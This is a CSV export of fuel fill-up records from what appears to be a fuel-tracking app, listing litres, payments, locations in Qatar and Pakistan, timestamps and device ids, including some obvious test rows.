id,fuel_filled,amount_paid,driver_name,location,fuel_supervisor_name,fill_up_date,image,created_at,updated_at,device_id,module_id,payment_method_id,use_case_id,customer_id,status_id,automated_entry
236,36.72,"0.00",,,,2022-04-16 03:14:12+00,"",2022-04-16 03:14:31.983911+00,2022-04-16 03:14:31.983926+00,362,1,2017,1,123,1,1
237,17.28,"0.00",,"Street 1110, Al Rayyan, 40466, Qatar",,2022-04-17 06:45:20+00,"",2022-04-17 06:45:54.660529+00,2022-04-17 06:45:54.660539+00,362,1,2017,1,123,1,1
238,44.34,"0.00",,,,2022-04-17 15:57:43+00,"",2022-04-17 15:58:04.675987+00,2022-04-17 15:58:04.675998+00,362,1,2017,1,123,1,1
239,58.11,"0.00",,,,2022-04-19 15:35:14+00,"",2022-04-19 15:35:39.471987+00,2022-04-19 15:35:39.471999+00,362,1,2017,1,123,1,1
240,62.31,"0.00",,,,2022-04-21 15:29:11+00,"",2022-04-21 15:29:22.708411+00,2022-04-21 15:29:22.708421+00,362,1,2017,1,123,1,1
241,20.61,"0.00",,"Bu Samra Street, Al Rayyan, 40466, Qatar",,2022-04-21 16:54:40+00,"",2022-04-21 16:55:03.459619+00,2022-04-21 16:55:03.459636+00,362,1,2017,1,123,1,1
242,"21.40","0.00",,"Al Rayyan, 40466, Qatar",,2022-04-21 16:56:04+00,"",2022-04-21 16:56:28.567906+00,2022-04-21 16:56:28.567917+00,362,1,2017,1,123,1,1
243,19.83,"0.00",,"Street 1106, Al Rayyan, 40466, Qatar",,2022-04-22 05:05:42+00,"",2022-04-22 05:06:01.312756+00,2022-04-22 05:06:01.312767+00,362,1,2017,1,123,1,1
244,19.05,"0.00",,"Street 1110, Al Rayyan, 40466, Qatar",,2022-04-22 05:07:46+00,"",2022-04-22 05:07:59.772733+00,2022-04-22 05:07:59.772744+00,362,1,2017,1,123,1,1
245,65.72,"0.00",,,,2022-04-24 02:32:48+00,"",2022-04-24 02:33:08.286432+00,2022-04-24 02:33:08.286443+00,362,1,2017,1,123,1,1
128,"27.20","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-19 07:23:35.103495+00,"",2022-02-19 07:24:04.212298+00,2022-02-19 07:24:04.212316+00,552,1,2017,1,9,"0",1
129,"64.60","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-19 07:32:56.602204+00,"",2022-02-19 07:33:27.674688+00,2022-02-19 07:33:27.674701+00,552,1,2017,1,9,"0",1
130,"37.40","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-19 07:40:39.260245+00,"",2022-02-19 07:41:10.300074+00,2022-02-19 07:41:10.300093+00,552,1,2017,1,9,"0",1
132,"64.60","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-02-19 17:41:10.576257+00,"",2022-02-19 17:41:50.912626+00,2022-02-19 17:41:50.912637+00,552,1,2017,1,9,"0",1
133,"27.20","0.00",,"Begum Iqbal Sarfraz Road (Bazar Road), G-6, Blue Area, Islamabad Capital Territory, 4400, Pakistan",,2022-02-19 17:42:37.384383+00,"",2022-02-19 17:43:04.832683+00,2022-02-19 17:43:04.832694+00,552,1,2017,1,9,"0",1
134,"100.00","100.00",nagina prod mirror,islamabad,test,2022-02-20 09:48:38+00,avatars/552.jpeg,2022-02-20 09:49:02.394742+00,2022-02-20 09:49:02.394784+00,552,1,2017,1,9,"0",
135,"80000.00","80000.00",nagina prod mirror,islamabad,test,2022-02-20 09:51:11+00,avatars/552_Hc4E23Q.jpeg,2022-02-20 09:51:36.665936+00,2022-02-20 09:51:36.665959+00,552,1,2017,1,9,"0",
136,"80000.00","80000.00",nagina prod mirror,"M6X8+9PG, Bahria Enclave, Malot, Islamabad, Islamabad Capital Territory, Pakistan",testing,2022-02-20 09:58:45+00,avatars/552_D5euZhA.jpeg,2022-02-20 09:59:05.637286+00,2022-02-20 09:59:05.637311+00,552,1,2017,1,9,"0",
201,"2215.40","0.00",,"Islamabad, Punjab",,2022-02-28 21:44:38.044831+00,"",2022-02-28 21:45:07.206495+00,2022-02-28 21:45:07.206504+00,581,1,2017,1,9,"0",1
247,52.63,"0.00",,,,2022-04-26 02:47:30+00,"",2022-04-26 02:47:47.834394+00,2022-04-26 02:47:47.834407+00,362,1,2017,1,123,1,1
258,18.65,"0.00",,"Umm Salal, Qatar",,2022-04-27 03:34:11+00,"",2022-04-27 03:34:40.032667+00,2022-04-27 03:34:40.032677+00,362,1,2017,1,123,1,1
259,19.24,"0.00",,,,2022-04-27 06:23:03+00,"",2022-04-27 06:23:14.335937+00,2022-04-27 06:23:14.335948+00,362,1,2017,1,123,1,1
260,18.45,"0.00",,,,2022-04-27 17:52:57+00,"",2022-04-27 17:53:17.388769+00,2022-04-27 17:53:17.388779+00,362,1,2017,1,123,1,1
261,"58.30","0.00",,,,2022-04-28 03:06:11+00,"",2022-04-28 03:06:31.123949+00,2022-04-28 03:06:31.123959+00,362,1,2017,1,123,1,1
262,15.82,"0.00",,"Al Rayyan, Qatar",,2022-04-28 03:44:21+00,"",2022-04-28 03:44:55.824369+00,2022-04-28 03:44:55.824379+00,362,1,2017,1,123,1,1
263,15.52,"0.00",,"Bu Samra Street, Al Rayyan, 40466, Qatar",,2022-04-28 04:15:32+00,"",2022-04-28 04:15:59.449412+00,2022-04-28 04:15:59.449423+00,362,1,2017,1,123,1,1
264,"16.30","0.00",,,,2022-04-29 12:07:00+00,"",2022-04-29 12:07:21.540585+00,2022-04-29 12:07:21.540596+00,362,1,2017,1,123,1,1
265,57.81,"0.00",,,,2022-04-30 02:55:06+00,"",2022-04-30 02:55:34.095457+00,2022-04-30 02:55:34.095473+00,362,1,2017,1,123,1,1
266,58.11,"0.00",,,,2022-05-02 03:30:12+00,"",2022-05-02 03:30:40.798229+00,2022-05-02 03:30:40.798242+00,362,1,2017,1,123,1,1
267,20.03,"0.00",,"Qatar Distribution Company (QDC);QDC, Leawaina Street, Al Rayyan, 23149, Qatar",,2022-05-02 04:53:45+00,"",2022-05-02 04:54:13.644275+00,2022-05-02 04:54:13.644286+00,362,1,2017,1,123,1,1
268,19.34,"0.00",,,,2022-05-02 16:04:19+00,"",2022-05-02 16:04:22.304746+00,2022-05-02 16:04:22.304757+00,362,1,2017,1,123,1,1
248,"32.00","0.00",,"Abraj Quartier, Doha, 23619, Qatar",,2022-04-26 21:56:59.78387+00,"",2022-04-26 21:57:31.576737+00,2022-04-26 21:57:31.576755+00,656,1,2017,1,146,"0",1
269,16.21,"0.00",,,,2022-05-03 15:29:49+00,"",2022-05-03 15:30:12.284994+00,2022-05-03 15:30:12.285005+00,362,1,2017,1,123,1,1
270,66.21,"0.00",,,,2022-05-04 15:41:39+00,"",2022-05-04 15:42:01.830588+00,2022-05-04 15:42:01.830604+00,362,1,2017,1,123,1,1
271,"50.10","0.00",,,,2022-05-07 03:04:20+00,"",2022-05-07 03:04:49.736555+00,2022-05-07 03:04:49.736571+00,362,1,2017,1,123,1,1
272,20.51,"0.00",,"Dukhan Road, Al Rayyan, Qatar",,2022-05-07 04:06:35+00,"",2022-05-07 04:07:00.318078+00,2022-05-07 04:07:00.318089+00,362,1,2017,1,123,1,1
273,"30.00","0.00",,"University Street, Hazm Al Markhiya, Doha, ZONE 65, Qatar",,2022-05-08 09:26:07+00,"",2022-05-08 09:26:44.411621+00,2022-05-08 09:26:44.411632+00,415,1,2017,1,9,1,1
312,"21.00","0.00",,"Street 180, Costa Malaz, Doha, Qatar",,2022-09-08 13:50:18+00,"",2022-09-08 13:50:21.54979+00,2022-09-08 13:50:21.549801+00,415,1,2017,1,9,1,1
313,"23.50","0.00",,"Srinagar Highway, G-10, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-09-22 16:43:19.574772+00,"",2022-09-22 16:45:47.896+00,2022-09-22 16:45:47.896016+00,678,1,2017,1,9,1,1
314,"20.00","5000.00",testppvt,sirinagar highway,testppvt,2022-09-23 08:28:30+00,"",2022-09-23 08:29:34.208281+00,2022-09-23 08:29:56.604446+00,415,1,2017,1,9,"0",
315,"46.00","0.00",,"Street 180, Costa Malaz, Doha, Qatar",,2022-09-25 09:31:14+00,"",2022-09-25 09:31:17.069706+00,2022-09-25 09:31:17.069716+00,415,1,2017,1,9,1,1
316,"10.00","10.00",tariq,"Unnamed Road, Doha, Qatar",cuz,2022-10-02 12:39:04+00,avatars/726.jpeg,2022-10-02 12:40:05.450288+00,2022-10-02 12:40:05.450324+00,726,1,2017,1,146,1,
249,"80.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:27:04.733215+00,"",2022-04-26 22:27:31.586392+00,2022-04-26 22:27:31.586409+00,656,1,2017,1,146,"0",1
250,"78.00","0.00",,"Saddar Road, G-6, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:28:11.048165+00,"",2022-04-26 22:28:32.119042+00,2022-04-26 22:28:32.119053+00,656,1,2017,1,146,"0",1
251,"78.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:29:18.184199+00,"",2022-04-26 22:29:34.159908+00,2022-04-26 22:29:34.159919+00,656,1,2017,1,146,"0",1
252,"78.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:30:26.2352+00,"",2022-04-26 22:30:34.451659+00,2022-04-26 22:30:34.451675+00,656,1,2017,1,146,"0",1
253,"42.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:37:26.501499+00,"",2022-04-26 22:37:36.432711+00,2022-04-26 22:37:36.432724+00,656,1,2017,1,146,"0",1
254,"78.00","0.00",,"Islamabad College For Boys, Street 8, G-6/3, G-6, Islamabad, Islamabad Capital Territory, 4400, Pakistan",,2022-04-26 22:38:14.168187+00,"",2022-04-26 22:38:32.242034+00,2022-04-26 22:38:32.242045+00,656,1,2017,1,146,"0",1
255,"78.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:39:20.780988+00,"",2022-04-26 22:39:33.257311+00,2022-04-26 22:39:33.257322+00,656,1,2017,1,146,"0",1
256,"190.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:43:55.585255+00,"",2022-04-26 22:44:04.262712+00,2022-04-26 22:44:04.262723+00,656,1,2017,1,146,"0",1
257,"162.00","0.00",,"Srinagar Highway, G-7, Islamabad, Islamabad Capital Territory, 44000, Pakistan",,2022-04-26 22:54:51.24996+00,"",2022-04-26 22:55:03.062093+00,2022-04-26 22:55:03.062104+00,656,1,2017,1,146,"0",1
317,"123.00","20.00",Awais,ISL,Awais,2022-11-06 06:28:37+00,"",2022-11-13 06:28:39.192005+00,2022-11-13 06:28:39.192016+00,823,1,2017,1,3682,1,
318,"123344.00","23.00",A,ISl,B,2022-11-09 06:29:01+00,"",2022-11-13 06:29:02.457196+00,2022-11-13 06:29:02.457213+00,822,1,2017,1,3682,1,
319,"100.00","100.00",Abdul,Shell,Mubashir,2022-11-13 07:24:01+00,"",2022-11-13 07:24:50.41549+00,2022-11-13 07:24:50.415499+00,824,1,2017,1,3685,1,
320,"100.00","100.00",ALiya,Askari,Mubashir,2022-11-13 07:24:01+00,"",2022-11-13 07:25:35.760624+00,2022-11-13 07:25:35.760635+00,825,1,2020,1,3685,1,
321,"100.00","100.00",karam,Shell PSO,Mubashir,2022-11-13 07:24:01+00,"",2022-11-13 07:26:11.478807+00,2022-11-13 07:26:11.478818+00,824,1,2019,1,3685,1,
322,"100.00","100.00",Raza,Loc,Mub,2022-11-17 10:00:51+00,"",2022-11-17 10:01:13.104066+00,2022-11-17 10:01:13.104116+00,852,1,2017,1,3755,1,
